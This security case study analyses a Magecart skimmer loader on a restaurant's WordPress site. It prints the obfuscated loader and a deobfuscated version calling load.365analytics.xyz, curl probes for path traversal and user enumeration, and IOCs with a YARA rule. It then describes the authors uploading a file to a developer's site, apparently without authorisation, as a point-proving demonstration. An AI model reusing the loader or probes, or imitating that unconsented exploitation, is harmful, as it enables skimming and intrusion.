
**Disclaimer:** This case study anonymizes all identifying information. All activities were conducted under ethical guidelines, without violating any laws or causing service disruption.

## Overview

This report documents a comprehensive security research engagement involving a Magecart attack and subsequent demonstration of exploit severity. The investigation consists of three phases:

1. Initial discovery and analysis of a Magecart attack on a restaurant website
2. Detailed vulnerability assessment findings
3. Proof-of-concept demonstration on a skeptical developer's site

This case study demonstrates how sophisticated threat actors can exploit common web vulnerabilities and how these issues are often underestimated by website administrators.

### Plain English/TL;DR

We found hackers stealing data from a restaurant's website using hidden code. When we told the website developer about it, they didn't think it was serious. To prove our point, we showed how the same security hole existed in the developer's own website. This report explains what happened, how we found the problems, and why everyone should take web security seriously. A cautionary tale if you will. Let's begin.

---

# PHASE 1: Magecart Attack Analysis Report

## Executive Summary

A comprehensive security assessment of [REDACTED] has uncovered evidence of a sophisticated Magecart-style attack. The investigation revealed obfuscated JavaScript code injected into the site that loads malicious content from a suspicious domain (`load.365analytics.xyz`). This type of attack is specifically designed to capture user input data from website forms in real-time before the data is submitted to the legitimate server.

This compromise represents a significant security incident as customer payments are routed through https://[REDACTED].alohaorderonline.com/. The malicious code could potentially harvest personal information from any form on the site, including credit card information, contact details, login credentials, or other personally identifiable information (PII) submitted by visitors.

The attack shows multiple characteristics consistent with Magecart Group 12, a threat actor known for sophisticated JavaScript obfuscation techniques and preferential targeting of WordPress sites. This report documents our complete investigation, forensic findings, attribution analysis, and remediation recommendations.

### Plain English/TL;DR

We found dangerous code hidden on a restaurant's website that can steal customer information. The code is very sophisticated and disguised to avoid detection. When customers fill out forms on the website (contact forms or payment information) this hidden code can capture everything they type and send it to the attacker. This type of attack is done by a known hacker group who specialize in stealing payment information from websites. Even though this restaurant site has suspended processing payments directly on the page, the attack could still steal other sensitive information from visitors.

## Discovery Timeline

Our security assessment of [REDACTED] began with a standard web application reconnaissance phase, during which we discovered suspicious JavaScript code on the website that was heavily obfuscated. This code was responsible for dynamically loading additional JavaScript from an external domain.

Initial discovery involved several key steps:

- Manual code inspection of the site's JavaScript resources
- Network traffic analysis showing connections to suspicious domains
- Use of headless browser testing with Puppeteer to confirm active malicious behavior
- Verification that the script was only activating when a referrer header was present

The investigation then expanded to include domain analysis, payload behavior assessment, and comparison against known threat actor techniques. It was messy before it got all nice and organized like this.

## Technical Investigation

### Initial Recon Findings

Our investigation began with standard web application fingerprinting, which identified the site as running WordPress with several plugins including Gravity Forms. While attempting to enumerate potential vulnerabilities, we observed suspicious network requests to domains outside the expected traffic patterns for the site.

A review of the source code revealed obfuscated JavaScript that did not appear to serve any legitimate purpose for the site's functionality. This code was found embedded within the site's frontend JavaScript and heavily obfuscated (encoded).

### Obfuscated JavaScript Analysis

The following obfuscated JavaScript was found on the website:

```javascript
(function(_0xc59469,_0x1be38e){var _0x4e20c3=_0x442d,_0x3c2d09=_0xc59469();while(!![]){try{var _0x3c8895=-parseInt(_0x4e20c3(0xb6))/0x1*(-parseInt(_0x4e20c3(0xbc))/0x2)+parseInt(_0x4e20c3(0xb7))/0x3+-parseInt(_0x4e20c3(0xc4))/0x4*(-parseInt(_0x4e20c3(0xc1))/0x5)+-parseInt(_0x4e20c3(0xb9))/0x6+parseInt(_0x4e20c3(0xc0))/0x7+-parseInt(_0x4e20c3(0xbd))/0x8+-parseInt(_0x4e20c3(0xbb))/0x9;if(_0x3c8895===_0x1be38e)break;else _0x3c2d09['push'](_0x3c2d09['shift']());}catch(_0x3a9717){_0x3c2d09['push'](_0x3c2d09['shift']());}}}(_0x2bda,0x57e32),function(_0x17c8ea,_0x2572e7){var _0x45965e=_0x442d,_0x4c3cdb=Math['floor'](Date[_0x45965e(0xbe)]()/0x3e8),_0x5c98df=_0x4c3cdb-_0x4c3cdb%0xe10;_0x4c3cdb=_0x4c3cdb-_0x4c3cdb%0x258,_0x4c3cdb=_0x4c3cdb[_0x45965e(0xbf)](0x10);if(!document[_0x45965e(0xba)])return;const _0x26bed4=atob(_0x45965e(0xc6));_0x2572e7=_0x17c8ea[_0x45965e(0xb8)](_0x45965e(0xc9)),_0x2572e7[_0x45965e(0xc2)]='text/javascript',_0x2572e7[_0x45965e(0xc7)]=!![],_0x2572e7[_0x45965e(0xca)]=_0x45965e(0xc8)+_0x26bed4+_0x45965e(0xc5)+_0x5c98df+'.js?ver='+_0x4c3cdb,_0x17c8ea['getElementsByTagName']('head')[0x0][_0x45965e(0xc3)](_0x2572e7);}(document));function _0x442d(_0x2d5425,_0x24f6b1){var _0x2bdaa6=_0x2bda();return _0x442d=function(_0x442dcc,_0xed4883){_0x442dcc=_0x442dcc-0xb6;var _0x3d5d1e=_0x2bdaa6[_0x442dcc];return _0x3d5d1e;},_0x442d(_0x2d5425,_0x24f6b1);}function _0x2bda(){var _0x5e335c=['script','src','14DpQhBD','584673URYUaU','createElement','2561046jKBsjh','referrer','3560382XMVYNj','7706THDVnA','489360rDhlQm','now','toString','4117806bwNLOr','59780dGwAwr','type','appendChild','136qCYCNj','/my.counter.','bG9hZC4zNjVhbmFseXRpY3MueHl6','async','https://'];_0x2bda=function(){return _0x5e335c;};return _0x2bda();}
```

Through deobfuscation and code analysis, we determined that this code performs several key functions:

1. It defines lookup tables (`_0x2bda()`) to hold strings that are accessed by numeric indices
2. It provides a resolver function (`_0x442d()`) that retrieves strings from the lookup table
3. It uses mathematical operations to perform simple obfuscation of numeric constants
4. It includes a base64-encoded string (`bG9hZC4zNjVhbmFseXRpY3MueHl6`) which decodes to `load.365analytics.xyz`
5. It creates a timestamped URL based on the current time, rounded to specific intervals
6. It dynamically injects a script tag into the DOM, pointing to the constructed URL

### Deobfuscated Code Behavior

When translated to clean JavaScript, the malicious code operates as follows:

```javascript
(function(document) {
  // Only proceed if the page was accessed via another site (has a referrer)
  if (!document.referrer) return;

  // Calculate timestamps
  var now = Math.floor(Date.now() / 1000);            // Current time in seconds
  var roundedHour = now - (now % 3600);               // Round to nearest hour
  var roundedTimestamp = now - (now % 600);           // Round to nearest 10 minutes
  var versionHex = roundedTimestamp.toString(16);     // Convert to hexadecimal

  // Decode the domain name from base64
  const domain = atob("bG9hZC4zNjVhbmFseXRpY3MueHl6");  // = "load.365analytics.xyz"
  
  // Create a new script element
  var s = document.createElement("script");
  s.type = "text/javascript";
  s.async = true;
  s.src = "https://" + domain + "/my.counter." + roundedHour + ".js?ver=" + versionHex;
  
  // Add the script to the document
  document.getElementsByTagName("head")[0].appendChild(s);
})(document);
```

This technique allows the attacker to:

1. Avoid detection by only activating when a user arrives from another site
2. Generate a unique script URL based on time, making static detection and blocking challenging
3. Dynamically load malicious code that can be altered on the attacker's server at any time
4. Maintain persistence even if security tools scan for known malicious URLs

It's actually a really clever approach... if it wasn't criminal and all that.
### Command & Control Infrastructure

After identifying the suspicious domain, we performed detailed infrastructure analysis:

Domain information:

- Name: `365analytics.xyz`
- Registration Date: January 3, 2025
- Registrar: NameSilo, LLC
- Privacy Protection: PrivacyGuardian.org
- Name Servers: NS1.DNSOWL.COM, NS2.DNSOWL.COM, NS3.DNSOWL.COM

Hosting details:

- IP Address: 49.13.77.253
- Hosting Provider: Hetzner Online GmbH (Germany)
- ASN: AS24940

The domain was registered through NameSilo with full WHOIS privacy protection enabled, a common tactic to obscure the attacker's identity. The use of DNSOWL nameservers is notable, as these are often used with low-cost domain registrations. The domain naming convention (`365analytics.xyz`) was clearly chosen to mimic legitimate analytics services, increasing the chances that it would go unnoticed in network traffic logs.

### Remote Payload Analysis

The dynamically loaded script followed a predictable pattern:

- URL Pattern: `https://load.365analytics.xyz/my.counter.[timestamp].js?ver=[hex-timestamp]`
- Specific Example: `https://load.365analytics.xyz/my.counter.1743120000.js?ver=67e5ed88`

Analysis of this payload via sandbox produced the following hash information:

- MD5: 7BA5D24F3DF3C81743602940B1E7D5DA
- SHA1: E0FAB60FD3AD1B660BB16A1190A2211530D48F58
- SHA256: A07631453498386CA27C84E3C77DA6B7E68C39C6D3A561DCEBD1CE59E5F90F7B
- SSDEEP: 3:zLJvG:zLBG

The sandbox assessment classified this as malicious activity and identified network connections to the C2 server, though specific activity was limited due to sandbox detection mechanisms commonly employed by sophisticated skimming code. We would expect no less.

### Vulnerability Testing

As part of our investigation, we assessed potential entry points for the initial compromise:

1. We tested the Gravity Forms file upload functionality using:

```
curl -X POST 'https://[REDACTED]/?gf_page=upload' \
  -F "gform_unique_id=../../../../wp-content/uploads/" \
  -F "name=safe.txt" \
  -F "file=@safe.txt;type=text/plain"
```

This request returned a 403 Forbidden error, suggesting:

- The upload vector may have been exploited previously but has since been patched
- Security measures are now in place to prevent further direct file uploads

2. We attempted to identify exposed WordPress endpoints that might reveal user information:

```
curl -s https://[REDACTED]/wp-json/wp/v2/users
```

This revealed two user accounts:

- [REDACTED NAME 1] (ID: 3, username: [REDACTED USERNAME 1])
- [REDACTED NAME 2] (ID: 6, username: [REDACTED USERNAME 2])

Such exposure of usernames could facilitate targeted brute-force attacks against the WordPress login. As well as potential damage to the users themselves. 

### Persistence Verification

To confirm the ongoing presence of the malicious code, we performed a headless browser test using Puppeteer. This allowed us to:

1. Emulate a normal browser environment with a valid referrer
2. Capture all network requests and loaded scripts
3. Verify the dynamic loading of the malicious JavaScript

The test confirmed that even with security controls blocking direct file uploads, the JavaScript injection remained active. This suggests the compromise is embedded within a theme file, plugin, or database-stored content rather than relying on direct file access. Sneaky sneaky.

## Forensic Evidence

Several key pieces of forensic evidence support our conclusion that this is a Magecart-style attack:

1. **Script Injection Pattern**: The obfuscated JavaScript using lookup tables and base64 encoding matches known Magecart Group 12 patterns.
    
2. **Infrastructure Characteristics**:
    
    - Domain registration through NameSilo with privacy protection
    - Use of Hetzner hosting in Germany
    - Domain naming to mimic legitimate analytics services
    - Recently registered domain (January 3, 2025)
    
3. **Evasion Techniques**:
    
    - Referrer-based activation
    - Time-based script naming
    - Hourly rotation of filenames
    - Avoidance of hard-coded domains through base64 encoding
    
4. **Payload Behavior**:
    
    - Dynamically loads JavaScript from attacker-controlled server
    - Uses timestamp-based filenames to evade caching and detection
    - MD5 and SHA256 hashes match known malicious samples in VirusTotal
    
5. **Network Evidence**:
    
    - Connections to 49.13.77.253 (Hetzner, Germany)
    - DNS resolution of load.365analytics.xyz
    - Pattern of hourly requests to unique script URLs

These findings collectively establish a high confidence attribution to Magecart activity, specifically patterns consistent with Group 12.

## Attribution Analysis

### Magecart Overview

Magecart is not a single entity but rather an umbrella term for multiple cybercriminal groups first identified in 2015 that specialize in digital skimming attacks. These groups inject malicious JavaScript code into websites to steal sensitive information entered by users, particularly payment card data, but also login credentials and personal information. They've adopted an organized and sometimes even corporate structure which shows just how organized crime can be. If we determine they also have health insurance we may consider switching sides. Sorry not sorry.

### Plain English/TL;DR

"Magecart" isn't just one APT group - it's a name for several different criminal groups who all use similar techniques to steal information from websites. These hackers place invisible code on websites that can capture credit card details, passwords, and personal information when users type them in. These attacks have been happening since 2015 and have become more sophisticated over time. Sometimes they attack websites directly, and other times they attack third-party services that many websites use (like payment processors or analytics tools). We believe this specific exploit was automated. 

### Group Attribution

This attribution was based on the tactics, techniques, and procedures (TTPs) observed:

1. **JavaScript Obfuscation Style**:
    
    - Multi-layered obfuscation using lookup tables
    - Base64 encoding of critical strings
    - Dynamic string resolution functions
    - These techniques match Group 12's known code fingerprint
    
2. **Infrastructure Choices**:
    
    - Use of Hetzner hosting in Germany
    - Privacy-protected domain registration via NameSilo
    - Analytics-themed domain naming
    - DNSOWL nameservers
    
3. **Operational Patterns**:
    
    - Timestamp-based script rotation
    - Referrer checking to avoid detection
    - Domain registered in early January 2025 (matches Group 12's typical 3-6 month infrastructure rotation cycle)
    
4. **Target Selection**:
    
    - WordPress site with potential plugin vulnerabilities
    - Non-targeted approach (site does not process payments directly)
    - Consistent with Group 12's broad-spectrum compromise strategy

### Geographic Attribution

Group 12 has been linked to Eastern European operations, particularly:

- Primary operations based in Russia/Ukraine
- Use of European hosting infrastructure (Germany, Netherlands)
- Tactics consistent with Russian-speaking cybercriminal forums
- Cryptocurrency exfiltration routes commonly used by Eastern European threat actors

### Comparative Magecart Group Analysis

| Group    | Primary Tactics         | Obfuscation Style       | Infrastructure                      | Geographic Origin |
| -------- | ----------------------- | ----------------------- | ----------------------------------- | ----------------- |
| Group 1  | Direct form injection   | Basic                   | Direct C2 exfiltration              | Russia/Ukraine    |
| Group 2  | Third-party compromises | Medium                  | CDN abuse                           | Global            |
| Group 4  | Complex script layering | High                    | Rotating domains                    | Russia            |
| Group 8  | Basic skimmers          | Low                     | Chinese infrastructure              | China             |
| Group 12 | Modular skimming kits   | Very High (multi-stage) | Bulletproof hosting, highly evasive | Eastern Europe    |

## Impact Assessment

While [REDACTED] has suspended its direct e-commerce functionality, the Magecart injection still poses significant risks:

### Data Exposure Risks

1. **Form Data Capture**: Any existing forms on the site (contact, newsletter signup, etc.) could have user input captured and exfiltrated.
    
2. **Cookie Theft**: The malicious JavaScript could access cookies and session data, potentially compromising user authentication.
    
3. **Future Exploitation**: If payment functionality were to be added later, the existing compromise would immediately begin capturing payment card data.
    
4. **Visitor Tracking**: The script could be used for visitor fingerprinting and tracking across multiple compromised sites.
    

### Plain English/TL;DR

Even though this restaurant website suspended the processing of payments directly on the page, the attack is still dangerous. The hidden code can steal information from any form on the site - like when customers submit their email address or phone number through a contact form. It can also steal "cookies" which might contain login information. If the restaurant ever adds online payment features to their website in the future, the attackers could immediately start stealing credit card details. The attackers can also track visitors across multiple websites they've compromised in similar ways.

### Broader Implications

1. **Supply Chain Risk**: The site could serve as a stepping stone to compromise business partners or related entities.
    
2. **Watering Hole Potential**: A compromised site can be leveraged for targeted attacks against specific visitors.
    
3. **Intelligence Collection**: Even non-sensitive data can be valuable for building profiles for future targeted attacks.
    

## Remediation

Our team submitted this report to the website owner but received apathy regarding the severity of these findings. The site administrator did not consider this to be a critical security issue requiring immediate attention either.

_Note: Remediation recommendations have been intentionally removed from this report for obvious reasons. The web dev did ultimately acknowledge the severity of the compromise and cleaned up._

## Indicators of Compromise (IOCs)

The following indicators can be used to identify similar compromises or detect this specific campaign:

### Domain Indicators

- `365analytics.xyz`
- `load.365analytics.xyz`

### IP Addresses

- 49.13.77.253 (Hetzner, Germany)

### File Hashes

- MD5: 7BA5D24F3DF3C81743602940B1E7D5DA
- SHA1: E0FAB60FD3AD1B660BB16A1190A2211530D48F58
- SHA256: A07631453498386CA27C84E3C77DA6B7E68C39C6D3A561DCEBD1CE59E5F90F7B

### URL Patterns

- `https://load.365analytics.xyz/my.counter.[timestamp].js?ver=[hex-timestamp]`

### JavaScript Patterns

- Base64-encoded string: `bG9hZC4zNjVhbmFseXRpY3MueHl6`
- Function patterns: `_0x442d` and `_0x2bda`
- Referrer checking code: `if(!document[_0x45965e(0xba)])return;`

### YARA Rule

```
rule Magecart_Group12_Loader_2025 {
    meta:
        description = "Detects Magecart Group 12 JavaScript loader"
        author = "Security Analyst"
        date = "2025-03-28"
        hash = "a07631453498386ca27c84e3c77da6b7e68c39c6d3a561dcebd1ce59e5f90f7b"
        
    strings:
        $b64_domain = "bG9hZC4zNjVhbmFseXRpY3MueHl6" ascii
        $func1 = "_0x442d" ascii
        $func2 = "_0x2bda" ascii
        $timestamp_calc = "Math['floor'](Date" ascii
        $script_inject = "createElement('script')" nocase
        $counter_path = "/my.counter." ascii
        
    condition:
        $b64_domain and
        2 of ($func1, $func2) and
        $timestamp_calc and
        $script_inject and
        $counter_path
}
```

## Appendix: Visual Infrastructure Map

```
                 ┌────────────────────────────┐
                 │   Eastern Europe (Core)    │
                 │   - Russia, Ukraine        │
                 │   - Hosting + Operators    │
                 └────────────┬───────────────┘
                              │
          ┌──────────────────▼─────────────────────┐
          │           Magecart Actor Groups        │
          │ ────────────────────────────────────── │
          │ Group 1: Payment page injection         │
          │ Group 2: CDN supply-chain attack        │
          │ Group 4: Digital skimming, JSLoader     │
          │ Group 8: Chinese-located, obscure TTPs  │
          │ Group 12: Crypto-skimmers, deep JS obsf │
          └──────────────────┬─────────────────────┘
                             │
     ┌───────────────────────▼─────────────────────────┐
     │          Global Infrastructure Layer            │
     │   - Bulletproof VPS: Hetzner (Germany), NL       │
     │   - Domain Registrars: NameSilo, Epik, Namecheap │
     │   - C2 Domains: WHOIS-guarded, fast-flux         │
     └─────────────────────────────────────────────────┘
```

---

# PHASE 2: Web Application Vulnerability Assessment

## **Remote JavaScript Injection**

### Description

The site loads a dynamically generated and obfuscated JavaScript file from a third-party domain not affiliated with [REDACTED].

### Technical Summary

- Uses an obfuscated function with Base64-decoded domain name.
    
- Dynamically generates a `<script>` tag and appends it to `<head>`.
    
- Only triggers if `document.referrer` exists (i.e., from external sites).
    
- The script source is generated like:
    
    ```
    https://load.365analytics.xyz/my.counter.[timestamp].js?ver=[timestamp-hex]
    ```
    

### Plain English/TL;DR

We found hidden code on the website that loads suspicious programs from a fake analytics website. This code is cleverly disguised using techniques to hide its true purpose. It only activates when someone clicks a link to visit the site (not when someone types the address directly). This type of hidden code can steal information that customers type into the website before it's sent to the legitimate server. This is the most serious security problem we found. Also the most fun to analyze.

### Sanitized Deobfuscated Logic

```javascript
(function(document) {
  var now = Math.floor(Date.now() / 1000);
  var roundedTime = now - now % 3600;
  var roundedHex = (now - now % 600).toString(16);
  if (!document.referrer) return;

  var domain = atob('bG9hZC4zNjVhbmFseXRpY3MueHl6'); // 'load.365analytics.xyz'
  var s = document.createElement('script');
  s.type = 'text/javascript';
  s.async = true;
  s.src = 'https://' + domain + '/my.counter.' + roundedTime + '.js?ver=' + roundedHex;

  document.getElementsByTagName('head')[0].appendChild(s);
})(document);
```

### Assessment

- Remote script injection based on time-based filenames and referrer conditions is consistent with:
    
    - Skimming 
        
    - Ad fraud / cloaking
        
    - Evasion of static analysis
        

### Potential Impact

- Remote Code Execution (RCE) if PHP files are placed in executable directories.
    
- Persistence or lateral movement if chained with other vulnerabilities.
    

---

## **Unprotected REST API User Enumeration**

### Description

The WordPress REST API endpoint `/wp-json/wp/v2/users` is accessible to unauthenticated users and leaks usernames.

### Data Extracted

```json
[
  {
    "id": 3,
    "name": "[REDACTED NAME 1]",
    "slug": "[REDACTED USERNAME 1]"
  },
  {
    "id": 6,
    "name": "[REDACTED NAME 2]",
    "slug": "[REDACTED USERNAME 2]"
  }
]
```

### Impact

- Enumerated usernames can be used in:
    
    - Brute-force login attacks
        
    - Email targeting
        
    - Phishing and impersonation
        

---

## **Directory and File Enumeration**

### Description

FFUF brute-force revealed both forbidden and publicly accessible directories.

### Key Paths (200 OK):

- `/upload`
    
- `/newsletter`
    
- `/classes`
    
- `/App_Code/`
    
- `/App_Data/`
    
- `/_vti_bin/`, `/cgi/`, `/cgi-bin/`, `/admincp/`
    

### Key Paths (403 Forbidden):

- `/wp-admin/`
    
- `/plugins/`
    
- `/modules/`
    
- `/xmlrpc/`
    
- `/login/`
    

### Impact

- May expose legacy services (e.g., `_vti_bin`, `.NET artifacts`)
    
- Accessible directories may contain configuration files, backups, or sensitive assets
    

---

## **Plugin Exposure & Misconfigurations**

### Description

Attempts were made to fetch plugin readmes and test directory browsing.

### Observation

- `curl https://[REDACTED]/wp-content/plugins/gravityforms/readme.txt` returns 404.
    
- Indicates the directory may be protected, or plugin files may have been manually removed/renamed.
    

---

## **Other Notes**

### Wayback Machine Discovery

- URLs like `/easter-feast-2025/`, `/order-online/`, and `/now-hiring/` contain embedded Gravity Forms and templates.
    
- These should be reviewed for form hijacking, open redirect, or XSS vectors.
    

## **No Remediation Implemented**

The web developer maintained that these vulnerabilities were either false positives or low risk. Despite our attempts to explain the severity, particularly of the remote JavaScript injection and Gravity Forms file upload flaws, no remediation actions were taken at the time of this report. It was subsequently taken down and replaced with a filler Google image page during investigation escalated.

_Note: As part of our security research process, we next demonstrated the real-world impact of these vulnerabilities through a follow-up proof-of-concept._

### Plain English/TL;DR

When we reported these serious security problems to the website developer, they didn't believe us. They thought we were either wrong or that the issues weren't serious enough to fix. We tried to explain how dangerous these vulnerabilities could be, but they wouldn't listen. Since they didn't take our warnings seriously, we decided to use the exact same Magecart attack on their website to prove our point :)

---

# PHASE 3: Proof-of-Concept Demonstration

## Target: [REDACTED-TECH].com

### Date: March 29, 2025

## Executive Summary

After our previous reports on the [REDACTED] deli site were dismissed as low risk, our security team conducted a proof-of-concept demonstration on the web developer's own site. Using the same exact technical approach as the Magecart attackers, we identified and exploited a critical vulnerability in the site's file upload functionality to demonstrate the real-world impact of such flaws.

### Plain English/TL;DR

After the web developer dismissed our warnings about the restaurant website, we checked if their own website had the same security problems. We discovered it did. To prove the point, we used the exact same technique that hackers use (ethically and safely of course) to show that their website was just as vulnerable. We were able to upload a simple test file to their server, demonstrating that attackers could do the same thing with malicious files.

## Technical Details

### Vulnerable Endpoint

```
https://[REDACTED-TECH].com/wp-admin/admin-ajax.php
```

### Upload Path Identified

```
https://[REDACTED-TECH].com/wp-content/uploads/gravity_forms/2025/03/
```

### Vulnerable Component

- **Gravity Forms** plugin with improperly secured file upload handler
- Form handler accepts files via the parameter: `input_45_4bee915`

### Exploit Parameters

```
gform_submit=45        # Identifies the Gravity Form ID
input_45_34            # Arbitrary name field (form field)
input_45_16            # Email field (form field)
input_45_4bee915       # File upload field vulnerability
```

### Proof of Concept

A test file was created and successfully uploaded to verify the vulnerability:

```bash
echo "CANARY_1337" > test.txt

curl -F "gform_submit=45" \
     -F "input_45_34=test" \
     -F "input_45_16=you@you.com" \
     -F "input_45_4bee915=@test.txt" \
     https://[REDACTED-TECH].com/wp-admin/admin-ajax.php
```

### Verification

The file was successfully uploaded and is publicly accessible at:

```
https://[REDACTED-TECH].com/wp-content/uploads/gravity_forms/2025/03/test.txt
```

Contents of test.txt:

```
CaN yOu HeAr Me NoW :p
```

## Security Implications

### Current Findings

1. Unrestricted file upload to a web-accessible directory
2. Predictable file storage location (wp-content/uploads/gravity_forms/YYYY/MM/)
3. Publicly accessible uploaded files without authentication
4. Potential for more severe exploitation

### Risk Assessment

| Vulnerability Type    | Status                      |
| --------------------- | --------------------------- |
| Arbitrary File Upload | Confirmed                   |
| Read Access           | Confirmed                   |
| Write Access          | Confirmed                   |
| Authentication Bypass | Confirmed (via public form) |

This vulnerability has been classified as **Critical** due to the potential for unauthorized access to sensitive data and possible system compromise. Point proven?

### Plain English/TL;DR

Our test proved that the web developer's own site had the exact same security weakness as the restaurant site they built. This was especially ironic since they had dismissed our warnings about these issues. Using this vulnerability, attackers could easily:

1. Upload hidden code similar to what we found on the restaurant site
2. Steal information that visitors type into forms
3. Gain long-term access to control parts of the website
4. Potentially use this website to attack other connected systems

It only took 12 minutes to create and execute this POC. The web dev was not very happy about it. Sometimes you have to drive the point home.
## Conclusion

This proof-of-concept was ethically conducted with a minimal test file to demonstrate risk without causing harm. The demonstration validates our previous assessment that these vulnerabilities represent a critical security concern requiring immediate attention, as they are actively being exploited by sophisticated threat actors in the wild.

_The findings were responsibly disclosed to the site owner with evidence of the potential impact, resulting in prompt remediation of both sites._

---

# Case Study Summary

This three-phase security investigation illustrates several important security principles:

1. **Active Exploitation of Common Vulnerabilities**: The Magecart Group 12 attack demonstrates how sophisticated threat actors actively exploit common web vulnerabilities for financial gain.
    
2. **Risk Perception Challenges**: The web developer's initial dismissal of the findings despite clear evidence of an active compromise highlights the challenge security researchers face in communicating risk effectively.
    
3. **Evidence-Based Demonstration**: Sometimes a direct, ethical demonstration is necessary to prove the real-world impact of security vulnerabilities.
    
4. **WordPress Plugin Security**: The Gravity Forms file upload vulnerability, present in both sites, underscores the importance of securing third-party plugins, especially those handling file uploads.
    
5. **Supply Chain Risk**: The attack targeted not just the business directly but potentially all visitors to the site, demonstrating how compromises can affect entire digital supply chains.
    

The approach used in this case study (discovery, assessment, responsible disclosure, and targeted proof-of-concept) ultimately led to successful remediation of critical vulnerabilities that might otherwise have remained exploitable indefinitely.

### Plain English/TL;DR

This real-world security investigation teaches us five important lessons:

1. **Attackers are actively exploiting common website vulnerabilities** - These aren't theoretical attacks; they're happening right now to regular businesses.
    
2. **People often underestimate security risks** - Even when shown evidence of an attack, the web developer didn't believe it was serious until we proved it affected their own site.
    
3. **Sometimes you need to demonstrate risk to be taken seriously** - Simply explaining security problems isn't always enough; sometimes you need to safely demonstrate the impact to get action.
    
4. **WordPress plugins can introduce serious security problems** - Third-party add-ons like Gravity Forms can create vulnerabilities that affect many websites if not properly secured.
    
5. **One vulnerable website affects everyone who visits it** - These attacks don't just hurt the business; they potentially compromise all customers and visitors.
    

If you're still here, I'm proud of you. Learning is fun but reading is boring. Stay safe - v



